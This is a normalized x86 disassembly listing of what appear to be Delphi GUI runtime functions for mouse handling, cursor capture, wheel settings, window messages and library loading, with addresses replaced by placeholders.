jns r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jl r-xdata
cmp eax [ ebp - 0xc ]
jg r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jl r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x2
mov bl 0x3
jmp r-xdata
sub_47eec0
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_47c708
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
mov eax ebx
call sub_47c7d8
mov edx [ ebx + 0x20 ]
sub edx eax
mov [ ebx + 0x24 ] edx
jmp r-xdata
mov eax ebx
call sub_47cda8
test eax eax
je r-xdata
mov eax esi
call sub_47c7a0
test al al
jne r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_47ec54
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx + 0x14 ]
call sub_47d080
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_47cda8
mov edx [ ebx + 0x20 ]
call sub_47cd00
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x14 ]
call sub_47eec0
pop ecx
sub_47ef40
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi eax
mov esi [ edi + 0x14 ]
test esi esi
je r-xdata
mov eax [ edi + 0x14 ]
call sub_47c77c
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x64 ]
je r-xdata
mov bl 0x1
jmp r-xdata
cmp [ edi + 0x24 ] 0x0
jne r-xdata
mov eax esi
call sub_47c77c
dec eax
jne r-xdata
test bl bl
je r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add eax [ edx + 0xc ]
add eax 0xe
mov [ ebp - 0x4 ] eax
mov eax edi
call sub_47cda8
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi + 0x14 ]
call sub_47ef40
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_47ec54
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ edi + 0x14 ]
call sub_47d080
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ edi + 0x14 ]
call sub_47c9a4
mov eax edi
call sub_47cd9c
test eax eax
je r-xdata
mov eax edi
call sub_47cda8
mov esi eax
mov eax esi
call sub_47ccc4
push eax
mov eax esi
call sub_47c7d8
pop edx
sub edx eax
sub edx [ edi + 0x24 ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov eax edi
call sub_47cd9c
call sub_47ccc4
sub eax [ edi + 0x24 ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov [ ebp - 0x8 ] esi
mov eax esi
call sub_47ccc4
sub eax [ edi + 0x24 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x20 ] eax
mov [ ebp - 0xc ] edi
mov eax esi
call sub_47ccc4
add eax [ edi + 0x24 ]
mov edx [ ebp - 0xc ]
mov [ edx + 0x20 ] eax
mov eax edi
call sub_47cda8
call sub_47cd3c
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov esi edi
mov eax edi
call sub_47c7d8
add eax [ edi + 0x24 ]
mov [ esi + 0x20 ] eax
mov eax edi
call sub_47cd9c
call sub_47cd3c
mov bl 0x1
jmp r-xdata
sub_47f078
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_47d018
test eax eax
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x40 ]
mov [ ebp - 0x10 ] eax
mov eax [ esi + 0x44 ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_47d800
test eax eax
je r-xdata
push ebp
call sub_47eec0
pop ecx
push ebp
call sub_47ef40
pop ecx
jmp r-xdata
xor ebx ebx
mov ebx [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x90 ]
jmp r-xdata
push ebx
mov edx ebx
mov eax esi
call sub_47ee44
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub_47f100
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov esi edx
mov edi eax
mov [ esp + 0xc ] 0x0
mov eax [ esi ]
cmp eax 0x204
jg r-xdata
sub eax 0x205
je r-xdata
je r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
lea eax [ esp + 0x14 ]
push eax
movzx eax [ esi + 0x4 ]
call sub_49450c
mov ecx eax
mov dl 0x1
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
dec eax
je r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
lea eax [ esp + 0x14 ]
push eax
movzx eax [ esi + 0x4 ]
call sub_49450c
mov ecx eax
mov dl 0x1
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x14 ]
jmp r-xdata
cmp eax 0x201
jg r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
lea eax [ esp + 0x14 ]
push eax
movzx eax [ esi + 0x4 ]
call sub_49450c
mov ecx eax
or cx [ r-xdata ]
mov dl 0x1
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x14 ]
jmp r-xdata
sub eax 0xae2a
je r-xdata
sub eax 0x202
je r-xdata
je r-xdata
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x32 ] 0x0
je r-xdata
mov edx esi
mov eax [ edi + 0x34 ]
call [ edi + 0x30 ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
sub eax 0x12
jne r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
lea eax [ esp + 0x14 ]
push eax
movzx eax [ esi + 0x4 ]
call sub_49450c
mov ecx eax
xor edx edx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
dec eax
je r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
lea eax [ esp + 0x14 ]
push eax
movzx eax [ esi + 0x4 ]
call sub_49450c
mov ecx eax
xor edx edx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x14 ]
jmp r-xdata
sub eax 0x20
je r-xdata
mov edx esi
mov eax [ edi + 0x34 ]
call [ edi + 0x30 ]
mov [ esp + 0xc ] 0x1
mov ebp [ esi + 0x8 ]
lea eax [ ebp + 0x38 ]
push eax
lea ecx [ ebp + 0x18 ]
lea edx [ ebp + 0x28 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x34 ]
mov eax [ esi + 0x8 ]
cmp [ eax ] 0xb00b
jne r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
lea eax [ esp + 0x14 ]
push eax
movzx eax [ esi + 0x4 ]
call sub_49450c
mov ecx eax
or cx [ r-xdata ]
xor edx edx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x14 ]
jmp r-xdata
jmp r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x10 ]
mov edx esp
mov eax [ edi + 0x14 ]
call sub_470990
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
cmp [ esi + 0x8 ] 0x1
jne r-xdata
sub eax 0x1e0
je r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ esi + 0x4 ]
mov eax edi
call sub_47f078
jmp r-xdata
mov eax [ edi + 0x14 ]
call sub_479ce0
cmp eax [ esi + 0x4 ]
jne r-xdata
movsx eax [ esi + 0xa ]
push eax
lea eax [ esp + 0x10 ]
push eax
movzx eax [ esi + 0x4 ]
call sub_49450c
mov edx eax
movsx ecx [ esi + 0x8 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x18 ]
jmp r-xdata
jmp r-xdata
mov eax [ edi + 0x14 ]
call sub_4784d0
test eax eax
jle r-xdata
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_47d800
mov ebx eax
test ebx ebx
je r-xdata
cmp [ esp + 0x8 ] 0x12
jne r-xdata
mov eax [ ebx + 0x14 ]
movzx eax [ eax + 0x10 ]
movsx edx [ eax * 2 + rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_49dac4
push eax
call SetCursor
mov [ esi + 0xc ] 0x1
mov [ esp + 0xc ] 0x1
jmp r-xdata
sub_47f398
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
mov [ esp ] ebx
fild [ esp ]
fdiv [ r-xdata ]
mov [ esp + 0x4 ] esi
fild [ esp + 0x4 ]
fmulp st1
call sub_404638
pop ecx
pop edx
pop esi
pop ebx
retn
sub_47f3c8
push ebx
push esi
add esp 0xfffffff8
mov ebx ecx
mov esi edx
test ebx ebx
je r-xdata
xor eax eax
mov [ esp ] esi
fild [ esp ]
mov [ esp + 0x4 ] ebx
fild [ esp + 0x4 ]
fdivp st1
fmul [ r-xdata ]
call sub_404638
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
sub_47f42c
push ebx
mov eax [ ecx ]
sub eax [ edx + 0x40 ]
add eax eax
sub [ ecx ] eax
mov eax [ ecx + 0x4 ]
sub eax [ edx + 0x44 ]
add eax eax
sub [ ecx + 0x4 ] eax
mov eax [ ecx + 0x8 ]
sub eax [ ecx ]
mov ebx [ edx + 0x48 ]
sub ebx eax
mov eax ebx
add eax eax
sub [ ecx + 0x8 ] eax
mov eax [ ecx + 0xc ]
sub eax [ ecx + 0x4 ]
mov edx [ edx + 0x4c ]
sub edx eax
mov eax edx
add eax eax
test eax eax
jle r-xdata
pop ebx
retn
sub [ ecx + 0xc ] eax
sub_47f46c
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
mov [ ebp - 0x2 ] cx
mov ebx eax
test dl dl
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
test [ ebp - 0x2 ] 0x40
je r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x14 ] eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x18 ]
mov eax ebx
call sub_47d800
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_47d800
mov esi eax
test esi esi
je r-xdata
cmp [ ebp - 0x8 ] 0x12
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x2
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x1c ] eax
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax ebx
call sub_47eb54
jmp r-xdata
cmp [ ebp - 0x8 ] 0x2
jne r-xdata
push 0x0
push 0x203
push 0x203
mov eax [ ebx + 0x14 ]
call sub_479ce0
push eax
lea eax [ ebp - 0x3c ]
push eax
call __imp_PeekMessageW
test eax eax
jne r-xdata
call sub_46f128
push 0x1
xor ecx ecx
xor edx edx
mov eax [ esi + 0x4 ]
call sub_471d54
jmp r-xdata
mov ebx [ esi + 0x4 ]
cmp [ ebx + 0x8b ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x1
mov eax ebx
call sub_46ffb4
cmp al 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0xe8 ]
or ecx 0xffffffff
xor edx edx
mov eax [ esi + 0x4 ]
call sub_471638
sub_47f594
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov eax [ edi ]
mov ebx [ eax + 0x18 ]
mov eax [ edi ]
mov esi [ eax + 0x60 ]
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax esi
mov edx 0x2
call sub_47c868
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jl r-xdata
mov eax esi
mov edx 0x1
call sub_47c868
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jl r-xdata
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_47edf4
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_47edf4
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x54 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov edx [ edi ]
mov [ edx + 0x54 ] eax
jmp r-xdata
sub_47f624
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
call sub_47ec78
mov [ ebp - 0xc ] ebx
mov eax [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x50 ] edx
mov edx [ ebp - 0x8 ]
mov [ eax + 0x54 ] edx
push ebp
call sub_47f594
pop ecx
mov eax [ ebp - 0x4 ]
call sub_47ec78
sub_47f670
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
test dl dl
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
cmp [ eax + 0x60 ] 0x0
jne r-xdata
call sub_47ebb4
mov edx [ ebp + 0x10 ]
mov [ ebp - 0xc ] edx
mov edx [ ebp + 0xc ]
mov [ ebp - 0x8 ] edx
lea ecx [ ebp - 0x4 ]
lea edx [ ebp - 0xc ]
call sub_47d800
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x4 ] 0x14
jne r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov eax esi
xor edx edx
call sub_470d70
jmp r-xdata
mov eax esi
call sub_49b6b8
jmp r-xdata
sub_47f6dc
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov esi edx
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x10 ] ecx
mov esi eax
xor eax eax
push ebp
push sub_47f7bf
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x8 ]
mov ebx eax
cmp [ ebp - 0x14 ] 0x12
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
xor edx edx
call sub_4070a8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47f7c6
lea eax [ ebp - 0x28 ]
call j_sub_4068a0
retn
mov eax [ ebp - 0x14 ]
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_4706f0
lea ecx [ ebp - 0x24 ]
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi ]
mov eax [ ebp - 0x24 ]
sub eax [ ebx + 0x40 ]
add eax eax
sub [ ebp - 0x24 ] eax
mov eax [ ebp - 0x20 ]
sub eax [ ebx + 0x44 ]
add eax eax
sub [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
mov edx [ ebx + 0x48 ]
sub edx eax
mov eax edx
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
mov edx [ ebx + 0x4c ]
sub edx eax
mov eax edx
add eax eax
sub [ ebp - 0x18 ] eax
lea edx [ ebp - 0x28 ]
mov eax ebx
call sub_470e50
mov edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
call sub_4070a8
mov eax [ ebp - 0x10 ]
mov edi eax
lea esi [ ebp - 0x24 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
sub eax 0x12
jne r-xdata
sub_47f7d0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4055c0
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] 0x5
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jge r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov al 0x1
mov [ esi + 0xd ] al
xor edx edx
mov eax esi
call sub_47f9f4
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
mov eax [ rw-data ]
cmp [ eax ] 0xa
jge r-xdata
sub_47f860
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x2c ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x20 ] 0x0
je r-xdata
xor edx edx
mov eax ebx
call sub_47f9cc
xor ecx ecx
mov dl 0x1
mov eax [ ebx + 0x2c ]
call [ eax + 0x2c ]
mov [ ebx + 0x28 ] eax
sub_47f88c
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_47f994
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4055e0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_47f8c4
push ebx
add esp 0xfffffff8
mov ebx edx
push ebx
call GetCursorPos
test eax eax
jne r-xdata
pop ecx
pop edx
pop ebx
retn
xor eax eax
mov [ esp ] eax
xor eax eax
mov [ esp + 0x4 ] eax
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
sub_47f8fc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x28 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xf0 ]
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_47f93c
push ebx
push esi
mov esi eax
push 0x4b
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x20 ] bl
test bl bl
je r-xdata
pop esi
pop ebx
retn
push 0x0
lea eax [ esi + 0x10 ]
push eax
push 0x0
push 0x68
call __imp_SystemParametersInfoW
sub_47f96c
push ebx
push ecx
mov ebx eax
push esp
lea eax [ ebx + 0x10 ]
push eax
lea ecx [ ebx + 0x14 ]
lea edx [ ebx + 0x24 ]
lea eax [ ebx + 0x1c ]
call sub_40c620
mov [ ebx + 0x18 ] eax
cmp [ ebx + 0x1c ] 0x0
setne al
mov [ ebx + 0x20 ] al
pop edx
pop ebx
retn
sub_47f994
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_47f8bc
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
jne r-xdata
push esi
call SetCapture
call ReleaseCapture
jmp r-xdata
sub_47f9cc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x28 ] esi
lea eax [ ebx + 0x28 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
sub_47f9f4
push ebx
mov ebx eax
sub edx 0x1
jb r-xdata
mov eax ebx
call sub_47f920
cmp [ ebx + 0xd ] 0x0
jne r-xdata
sub edx 0x67
je r-xdata
mov eax ebx
call sub_47f93c
pop ebx
retn
mov eax ebx
call sub_47f96c
jmp r-xdata
cmp [ ebx + 0x20 ] 0x0
je r-xdata
jmp r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call __imp_SendMessageW
mov [ ebx + 0x10 ] eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
push 0x0
push 0x68
call __imp_SystemParametersInfoW
jmp r-xdata
sub_47fa58
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
push 0x8000
call SetErrorMode
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47fbbe
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
call GetModuleHandleW
mov ebx eax
push r-xdata
push ebx
call sub_40bb70
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call SetErrorMode
retn
push r-xdata
call LoadLibraryW
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call sub_40bb70
mov [ rw-data ] eax
sub_47fdb4
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x3
je r-xdata
test bl bl
jne r-xdata
mov dl 0x1
mov eax esi
call sub_47fd98
cmp [ rw-data ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_47fd98
jmp r-xdata
push esi
call [ rw-data ]
mov edi eax
test edi edi
je r-xdata
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax ebx
dec al
je r-xdata
push 0x0
push edi
call [ rw-data ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
push edi
push esi
call [ rw-data ]
push 0x1
push edi
call [ rw-data ]
jmp r-xdata
jmp r-xdata
push 0x1
push edi
call [ rw-data ]
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax [ esp ]
and eax 0xfffffff4
movzx edx bl
movzx edx [ edx + rw-data ]
or eax edx
mov [ esp ] eax
sub_47fea0
mov eax [ rw-data ]
xor edx edx
mov [ rw-data ] edx
call sub_4055f0
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4055f0
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4055f0
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
call sub_4055f0
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_4055f0
movzx eax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
xor edx edx
call sub_4070a8
movzx eax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
xor edx edx
call sub_4070a8
cmp [ rw-data ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_47ff40
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4800cb
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetCurrentProcessId
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax r-xdata
call sub_4129f4
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_4070a8
mov eax [ rw-data ]
call sub_407134
push eax
call GlobalAddAtomW
mov [ rw-data ] ax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
call GetCurrentThreadId
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
lea edx [ ebp - 0x20 ]
mov ecx 0x1
mov eax r-xdata
call sub_4129f4
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_4070a8
mov eax [ rw-data ]
call sub_407134
push eax
call GlobalAddAtomW
mov [ rw-data ] ax
mov eax [ rw-data ]
call sub_407134
push eax
call RegisterWindowMessageW
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_430ee8
mov [ rw-data ] eax
call sub_47fa58
mov dl 0x1
mov eax [ r-xdata ]
call sub_47f7d0
mov [ rw-data ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_49d214
mov edx [ rw-data ]
mov [ edx ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_49e89c
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x1
call sub_4a10dc
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46fac0
mov [ rw-data ] eax
push r-xdata
call GetModuleHandleW
mov ebx eax
mov ecx r-xdata
mov edx sub_46d794
mov eax [ r-xdata ]
call sub_42fcb0
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4800d2
lea eax [ ebp - 0x10 ]
call j_sub_4068a0
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
push r-xdata
push ebx
call sub_40bb70
mov [ rw-data ] eax
sub_4801dc
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0xa8 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebp + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebp + 0xa8 ] bl
mov eax ebp
mov edx [ eax ]
call [ edx + 0x34 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_4305a0
test eax eax
je r-xdata
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_4305a0
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x8c ]
sub_480244
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0xa4 ]
cmp ebp eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
call sub_43c510
mov eax ebp
mov [ ebx + 0xa4 ] eax
test eax eax
je r-xdata
inc edi
xor esi esi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
mov edx ebx
call sub_43c22c
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4305a0
test eax eax
je r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4305a0
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x90 ]
sub_4802c4
